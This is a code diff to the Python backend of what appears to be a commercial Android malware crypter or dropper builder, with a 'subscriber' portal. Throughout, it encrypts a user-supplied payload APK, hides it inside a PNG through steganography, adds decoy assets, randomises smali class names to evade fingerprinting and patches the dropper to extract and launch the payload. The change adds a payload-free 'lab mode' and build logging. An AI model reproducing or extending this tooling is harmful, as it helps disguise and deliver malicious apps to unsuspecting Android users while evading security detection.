@@ -17,6 +17,7 @@ from services.build_state import BUILD_STATUS
 from services.dropper_template import ensure_dropper_template_ready
 from services.data import add_build_history, add_history, update_amplification
 from services.java_runtime import JAVA_BIN, java_env, keytool_bin
+from services.pp_monitor import verify_tp_stego_patch, write_pp_build_log
 from services.zip_safe import safe_zip_extract
 
 _STATUS_WORKING = "Gerando APK..."
@@ -171,7 +172,7 @@ def inject_decoy_assets(
     return written
 
 
-def apply_fingerprint_phase2(dropper_work: str) -> dict[str, str]:
+def apply_fingerprint_phase2(dropper_work: str, *, skip_tp_assets: bool = False) -> dict[str, str]:
     if _is_lite_dropper(dropper_work):
         return {
             "crypto_class": Config.CRYPTO_CLASS_TEMPLATE,
@@ -181,7 +182,8 @@ def apply_fingerprint_phase2(dropper_work: str) -> dict[str, str]:
     crypto_class = generate_unique_smali_class_name(dropper_work)
     rename_smali_class(dropper_work, Config.CRYPTO_CLASS_TEMPLATE, crypto_class)
     tp_asset, tp2_asset = generate_tp_asset_names()
-    patch_mainactivity_tp_assets(dropper_work, tp_asset, tp2_asset)
+    if not skip_tp_assets:
+        patch_mainactivity_tp_assets(dropper_work, tp_asset, tp2_asset)
     return {
         "crypto_class": crypto_class,
         "tp_asset": tp_asset,
@@ -1540,6 +1542,7 @@ def process_apk(
     custom_icon_path=None,
     persist=True,
     portal="subscriber",
+    lab_mode=False,
 ):
     BUILD_STATUS[build_id] = {
         "status": _STATUS_WORKING,
@@ -1557,7 +1560,7 @@ def process_apk(
         if persist:
             add_build_history(username, custom_app_name, "processando", build_id)
 
-        if not user_apk_path:
+        if not lab_mode and not user_apk_path:
             raise RuntimeError("Build exige APK de payload.")
 
         app_name = custom_app_name if custom_app_name else "App"
@@ -1578,35 +1581,42 @@ def process_apk(
             ephemeral=not persist,
         )
 
-        user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
-        if os.path.exists(user_apk_extracted):
-            shutil.rmtree(user_apk_extracted)
-        os.makedirs(user_apk_extracted, exist_ok=True)
-        safe_zip_extract(user_apk_path, user_apk_extracted)
-        _set_status(build_id, _STATUS_WORKING, 18)
+        if not lab_mode:
+            user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
+            if os.path.exists(user_apk_extracted):
+                shutil.rmtree(user_apk_extracted)
+            os.makedirs(user_apk_extracted, exist_ok=True)
+            safe_zip_extract(user_apk_path, user_apk_extracted)
+            _set_status(build_id, _STATUS_WORKING, 18)
 
-        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
-            _set_status(build_id, _STATUS_WORKING, 20)
-            subprocess.run(
-                [
-                    JAVA_BIN,
-                    "-jar",
-                    Config.APKTOOL_JAR,
-                    "d",
-                    user_apk_path,
-                    "-o",
-                    user_apk_extracted,
-                    "-f",
-                ],
-                capture_output=True,
-                text=True,
-                timeout=300,
-                env=java_env(),
-            )
+            if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
+                _set_status(build_id, _STATUS_WORKING, 20)
+                subprocess.run(
+                    [
+                        JAVA_BIN,
+                        "-jar",
+                        Config.APKTOOL_JAR,
+                        "d",
+                        user_apk_path,
+                        "-o",
+                        user_apk_extracted,
+                        "-f",
+                    ],
+                    capture_output=True,
+                    text=True,
+                    timeout=300,
+                    env=java_env(),
+                )
 
         _set_status(build_id, _STATUS_WORKING, 25)
-        dropper_template = ensure_dropper_template_ready()
-        old_package = Config.OLD_PACKAGE
+        if lab_mode:
+            from services.dropper_debug_template import ensure_dropper_debug_template_ready
+
+            dropper_template = ensure_dropper_debug_template_ready()
+            old_package = Config.OLD_PACKAGE
+        else:
+            dropper_template = ensure_dropper_template_ready()
+            old_package = Config.OLD_PACKAGE
 
         dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
         if os.path.exists(dropper_work):
@@ -1618,6 +1628,12 @@ def process_apk(
             return []
 
         shutil.copytree(dropper_template, dropper_work, ignore=_template_ignore)
+
+        if lab_mode:
+            assets_dir = os.path.join(dropper_work, "assets")
+            if os.path.isdir(assets_dir):
+                shutil.rmtree(assets_dir)
+
         _set_status(build_id, _STATUS_WORKING, 30)
 
         apply_version_info(dropper_work, version_name, version_code)
@@ -1628,11 +1644,19 @@ def process_apk(
         _set_status(build_id, _STATUS_WORKING, 36)
         fp_meta = apply_fingerprint_phase2(dropper_work)
         is_lite = _is_lite_dropper(dropper_work)
-        print(
-            f"[build {build_id}] stego -> pkg={new_package} "
-            f"lite={is_lite} crypto_class={fp_meta['crypto_class']} "
-            f"tp={fp_meta['tp_asset']!r} tp2={fp_meta['tp2_asset']!r}"
-        )
+        if lab_mode:
+            print(
+                f"[build {build_id}] lab A1 shell_full -> pkg={new_package} "
+                f"crypto_class={fp_meta['crypto_class']} "
+                f"tp={fp_meta['tp_asset']!r} tp2={fp_meta['tp2_asset']!r}"
+            )
+        else:
+            mode_label = "prod"
+            print(
+                f"[build {build_id}] stego/{mode_label} -> pkg={new_package} "
+                f"lite={is_lite} crypto_class={fp_meta['crypto_class']} "
+                f"tp={fp_meta['tp_asset']!r} tp2={fp_meta['tp2_asset']!r}"
+            )
 
         if custom_icon_path and os.path.exists(custom_icon_path):
             _set_status(build_id, _STATUS_WORKING, 40)
@@ -1701,98 +1725,112 @@ def process_apk(
                         pass
 
         _set_status(build_id, _STATUS_WORKING, 50)
-        prepared_apk, launch_class, payload_package = prepare_payload(
-            user_apk_path,
-            Config.UPLOAD_FOLDER,
-            build_id,
-        )
-
-        _set_status(build_id, _STATUS_WORKING, 64)
-        with open(prepared_apk, "rb") as fh:
-            payload_data = fh.read()
-        payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
-        payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)
-
-        _set_status(build_id, _STATUS_WORKING, 68)
-        from services.stego_png import embed_ciphertext_in_png, load_cover_png
-
-        key = secrets.token_bytes(32)
-        iv = secrets.token_bytes(16)
-        asset_name = random.choice(Config.STEGO_ASSET_NAME_POOL)
-        out_name = f"index_{secrets.token_hex(2)}.pak"
-        ciphertext = encrypt_payload(payload_data, key, iv)
-
-        roundtrip = decrypt_payload(ciphertext, key, iv)
-        if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
-            raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
-        if roundtrip != payload_data:
-            raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")
-
-        assets_dir = os.path.join(dropper_work, "assets")
-        os.makedirs(assets_dir, exist_ok=True)
-        for stale in os.listdir(assets_dir):
-            stale_path = os.path.join(assets_dir, stale)
-            if os.path.isfile(stale_path):
-                os.remove(stale_path)
-
-        cover_png = load_cover_png(custom_icon_path)
-        stego_bytes, stego_offset = embed_ciphertext_in_png(cover_png, ciphertext)
-        payload_path = os.path.join(assets_dir, asset_name)
-        with open(payload_path, "wb") as fh:
-            fh.write(stego_bytes)
-
-        decoys = inject_decoy_assets(assets_dir, asset_name)
-        _set_status(build_id, _STATUS_WORKING, 72)
-        print(
-            f"[build {build_id}] assets -> payload={asset_name!r} "
-            f"decoys={len(decoys)} {decoys}"
-        )
-        stego_size = os.path.getsize(payload_path)
-        print(
-            f"[build {build_id}] stego_png -> offset={stego_offset} size={stego_size}"
-        )
-        if stego_size > 20 * 1024 * 1024:
-            print(
-                f"[build {build_id}] AVISO stego: PNG payload "
-                f"{stego_size // (1024 * 1024)} MB — risco de OOM no decrypt "
-                f"em devices com pouca RAM; upload portal max 27 MB."
-            )
-
-        if is_lite:
-            patch_payload_util_smali(
-                dropper_work,
-                asset_name=asset_name,
-                out_name=out_name,
-                key=key,
-                iv=iv,
-                cipher=Config.CIPHER_TRANSFORM,
-            )
+        if lab_mode:
+            _set_status(build_id, _STATUS_WORKING, 76)
+            print(f"[build {build_id}] lab_mode A1: shell full, sem payload")
         else:
-            patch_vd_crypto_smali(
-                dropper_work,
-                asset_name=asset_name,
-                out_name=out_name,
-                key=key,
-                iv=iv,
-                cipher=Config.CIPHER_TRANSFORM,
-                crypto_class=fp_meta["crypto_class"],
+            prepared_apk, launch_class, payload_package = prepare_payload(
+                user_apk_path,
+                Config.UPLOAD_FOLDER,
+                build_id,
             )
 
-        patch_tp_stego_extract(dropper_work, stego_offset=stego_offset)
+            _set_status(build_id, _STATUS_WORKING, 64)
+            with open(prepared_apk, "rb") as fh:
+                payload_data = fh.read()
+            payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
+            payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)
 
-        bind_target_package(
-            dropper_work,
-            payload_package,
-            crypto_class=fp_meta["crypto_class"],
-            tp_asset=fp_meta["tp_asset"],
-            tp2_asset=fp_meta["tp2_asset"],
-        )
-        patch_w_explicit_launch(dropper_work, launch_class)
-        _set_status(build_id, _STATUS_WORKING, 76)
-        print(
-            f"[build {build_id}] target_pkg bound -> {payload_package} "
-            f"launch_class={launch_class}"
-        )
+            _set_status(build_id, _STATUS_WORKING, 68)
+            from services.stego_png import embed_ciphertext_in_png, load_cover_png
+
+            key = secrets.token_bytes(32)
+            iv = secrets.token_bytes(16)
+            asset_name = random.choice(Config.STEGO_ASSET_NAME_POOL)
+            out_name = f"index_{secrets.token_hex(2)}.pak"
+            ciphertext = encrypt_payload(payload_data, key, iv)
+
+            roundtrip = decrypt_payload(ciphertext, key, iv)
+            if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
+                raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
+            if roundtrip != payload_data:
+                raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")
+
+            assets_dir = os.path.join(dropper_work, "assets")
+            os.makedirs(assets_dir, exist_ok=True)
+            for stale in os.listdir(assets_dir):
+                stale_path = os.path.join(assets_dir, stale)
+                if os.path.isfile(stale_path):
+                    os.remove(stale_path)
+
+            cover_png = load_cover_png(custom_icon_path)
+            cover_size = len(cover_png)
+            stego_bytes, stego_offset = embed_ciphertext_in_png(cover_png, ciphertext)
+            payload_path = os.path.join(assets_dir, asset_name)
+            with open(payload_path, "wb") as fh:
+                fh.write(stego_bytes)
+
+            decoys = inject_decoy_assets(assets_dir, asset_name)
+            _set_status(build_id, _STATUS_WORKING, 72)
+            print(
+                f"[build {build_id}] assets -> payload={asset_name!r} "
+                f"decoys={len(decoys)} {decoys}"
+            )
+            stego_size = os.path.getsize(payload_path)
+            print(
+                f"[build {build_id}] stego_png -> offset={stego_offset} size={stego_size}"
+            )
+            if stego_size > 20 * 1024 * 1024:
+                print(
+                    f"[build {build_id}] AVISO stego: PNG payload "
+                    f"{stego_size // (1024 * 1024)} MB — risco de OOM no decrypt "
+                    f"em devices com pouca RAM; upload portal max 27 MB."
+                )
+
+            if is_lite:
+                patch_payload_util_smali(
+                    dropper_work,
+                    asset_name=asset_name,
+                    out_name=out_name,
+                    key=key,
+                    iv=iv,
+                    cipher=Config.CIPHER_TRANSFORM,
+                )
+            else:
+                patch_vd_crypto_smali(
+                    dropper_work,
+                    asset_name=asset_name,
+                    out_name=out_name,
+                    key=key,
+                    iv=iv,
+                    cipher=Config.CIPHER_TRANSFORM,
+                    crypto_class=fp_meta["crypto_class"],
+                )
+
+            patch_tp_stego_extract(dropper_work, stego_offset=stego_offset)
+            patch_check = verify_tp_stego_patch(dropper_work, stego_offset=stego_offset)
+            if not patch_check["ok"]:
+                raise RuntimeError(
+                    "Patch stego invalido: " + "; ".join(patch_check["errors"])
+                )
+            print(
+                f"[build {build_id}] stego_patch ok offset={patch_check['offset_hex']} "
+                f"locals={patch_check.get('locals')}"
+            )
+
+            bind_target_package(
+                dropper_work,
+                payload_package,
+                crypto_class=fp_meta["crypto_class"],
+                tp_asset=fp_meta["tp_asset"],
+                tp2_asset=fp_meta["tp2_asset"],
+            )
+            patch_w_explicit_launch(dropper_work, launch_class)
+            _set_status(build_id, _STATUS_WORKING, 76)
+            print(
+                f"[build {build_id}] target_pkg bound -> {payload_package} "
+                f"launch_class={launch_class}"
+            )
 
         _set_status(build_id, _STATUS_WORKING, 80)
         unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")
@@ -1843,7 +1881,7 @@ def process_apk(
                 err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                 raise RuntimeError(f"Erro na compilacao: {err[:500]}")
 
-        if getattr(Config, "INJECT_SECONDARY_DEX", False):
+        if getattr(Config, "INJECT_SECONDARY_DEX", False) and not lab_mode:
             _set_status(build_id, _STATUS_WORKING, 84)
             inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)
 
@@ -1886,6 +1924,21 @@ def process_apk(
 
         final_name = f"{secure_filename(app_name)}.apk"
         shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
+        if not lab_mode:
+            write_pp_build_log(
+                build_id,
+                new_package=new_package,
+                asset_name=asset_name,
+                stego_offset=stego_offset,
+                stego_size=stego_size,
+                cover_size=cover_size,
+                ciphertext_size=len(ciphertext),
+                decoys=decoys,
+                payload_package=payload_package,
+                launch_class=launch_class,
+                patch_check=patch_check,
+                output_apk=final_name if persist else None,
+            )
         BUILD_STATUS[build_id] = {
             "status": "Concluido",
             "progress": 100,
